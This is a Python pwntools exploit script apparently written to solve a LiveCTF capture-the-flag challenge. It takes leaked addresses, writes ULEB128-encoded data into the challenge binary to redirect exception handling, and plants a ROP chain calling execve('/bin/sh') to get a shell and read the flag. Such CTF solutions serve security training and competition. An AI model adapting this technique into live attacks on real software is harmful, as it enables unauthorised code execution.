from pwn import *
from subprocess import check_output

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, PORT)
p.recvline()

main = int(p.recvline().split(b": ")[1], 0)
var = int(p.recvline().split(b": ")[1], 0)
printf = int(p.recvline().split(b": ")[1], 0)

file = ELF("./handout/challenge", checksec=False)
libc = ELF("./handout/libc.so.6", checksec=False)
libs = ELF("./handout/libstdc++.so.6", checksec=False)

base = main - file.sym.main
libc.address = printf - libc.sym.printf
libs.address = libc.address + 0x240000
log.info(f"{base = :#x}")
log.info(f"{libc.address = :#x}")

def write(addr: int, data: int, again: int):
    p.sendlineafter(b"?\n", f"{addr:#x}".encode())
    p.sendlineafter(b"?\n", f"{data:#x}".encode())
    p.sendlineafter(b"?\n", f"{again}".encode())

def write_uleb(n: int):
    bits = []
    while n:
        bits.append(n & 0x7f)
        n >>= 7
    
    leb = b""
    for part in bits[:-1]:
        leb += p8(part | 0x80)
    leb += p8(bits[-1])
    return leb

tramp = 0x12e0
victim = libs.address + 0x000000000019eee3

start = 0x2264
target = write_uleb(victim - (base + tramp))
target = target.ljust(len(target) + 7 & ~7, b"\0")
for i in range(0, len(target), 8):
    qword = u64(target[i:i+8])
    write(base + 0x227f + i, qword, 1)

poprdi = libc.address + 0x000000000010f75b
poprsi = libc.address + 0x0000000000110a4d

chain = bytes()
chain += p64(poprdi)
chain += p64(next(libc.search(b"/bin/sh\0")))
chain += p64(poprsi)
chain += p64(0)
# rdx is already NULL
chain += p64(libc.sym.execve)

for i in range(0, len(chain), 8):
    qword = u64(chain[i:i+8])
    write(base + 0x2110 + i, qword, 1)

write(base + 0x2108, 0, 0)

p.sendline(b"./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)